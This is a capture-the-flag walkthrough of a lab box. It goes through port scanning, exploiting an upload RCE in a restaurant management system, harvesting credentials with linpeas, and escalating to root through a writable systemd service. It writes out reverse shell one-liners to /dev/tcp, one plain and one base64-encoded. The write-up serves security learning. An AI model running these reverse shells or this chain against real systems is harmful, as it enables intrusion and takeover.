1. Run nmap to discover any open ports from the server.
![image](https://github.com/user-attachments/assets/0f0e1839-d493-44a9-87d8-b75984fd3288)
2. Port 12340 is http-based service, I opened the website and it shows not found error.
![image](https://github.com/user-attachments/assets/fd400608-a2ce-4dba-bbd0-cc54c61a6b56)
3. Next step is enumerating the server and found /rms path.
![image](https://github.com/user-attachments/assets/91f7dfb3-510c-4bb1-b64e-231b121a1ee1)
4. Open the web and it shows the restaurant page. Realize that the web use restaurant management system as its service.
![image](https://github.com/user-attachments/assets/8f081f6c-1272-45f5-b09e-504fa0a86c36)
5. Searching for the vulnerability and found RCE vuln by uploading the reverse shell payload into the target system.
![image](https://github.com/user-attachments/assets/c8d2e2cc-ae07-448c-bd3c-c6a5390b76e1)
6. Running the script using python and the code successfully insert the reverse shell payload into the target system.
![image](https://github.com/user-attachments/assets/ad9f7c1e-7de6-491d-b776-595e1f951882) <br>
7. Try to run CMD command from the reverse shell file and it successfully executed. <br>
![image](https://github.com/user-attachments/assets/22c06f8c-a91b-4d39-832a-587069b52c0d)
8. So now I'm using this [script](https://www.revshells.com/) to do reverse shell into my terminal with the command below. <br>
**Command: sh -i >& /dev/tcp/10.21.155.12/7777 0>&1** <br>
![image](https://github.com/user-attachments/assets/be6d802a-3385-4831-8f43-2c71cd36f0d6)
9. It didn't work, so I tried to encode the payload with base64. <br>
<b> Command: echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMjEuMTU1LjEyLzc3NzcgMD4mMQo= | base64 -d | bash <b> <br>
![image](https://github.com/user-attachments/assets/7efd6c4a-a501-400a-8e18-58e91d346d8f) <br>
10. Successfully get the target terminal, I tried to open the user.txt file, but it shows permission denied error. <br>
![image](https://github.com/user-attachments/assets/366ed2d5-7df8-45c6-ad2a-7a79a79e3e65) <br>
11. Next thing is I run linpeas.sh inside the target terminal and found credentials information (the red color font) 
![image](https://github.com/user-attachments/assets/f40f35a4-a72d-4f6a-bfc6-9f2e4908a729)
12. Obtain the edward user password, I login using SSH protocol and able to open the user.txt file.
![image](https://github.com/user-attachments/assets/fdd5a249-a12b-4afa-b79c-22feeec9a8c9) <br>
13. For the root privilege, I run sudo -l command and it shows /usr/bin/reboot can be used to escalate my privilege.
![image](https://github.com/user-attachments/assets/01e432b1-b6c8-4c7c-80b0-ad78a7738ba7)
14. Checking from the linpeas.sh result, the /etc/systemd/system/zeno-monitoring.service file is writeable. I change the ExecStart value with the new value as shown in the picture below. <br>
![image](https://github.com/user-attachments/assets/2a3ee024-d92c-40bb-952c-82696d2ba0c3)
15. Reboot the terminal and wait for a minute to relogin into the system. <br>
![image](https://github.com/user-attachments/assets/7e0c50fa-c10b-436a-91ec-1d843bf524db)
16. Run /bin/bash -p inside the system and successfully become root inside the system. <br>
![image](https://github.com/user-attachments/assets/52c0e7e5-d4cc-48b6-b8e0-dbb59c165d04) <br>
17. The root flag is found in /root/root.txt file.
![image](https://github.com/user-attachments/assets/a862838c-f285-46da-b685-20675f3e5d28)

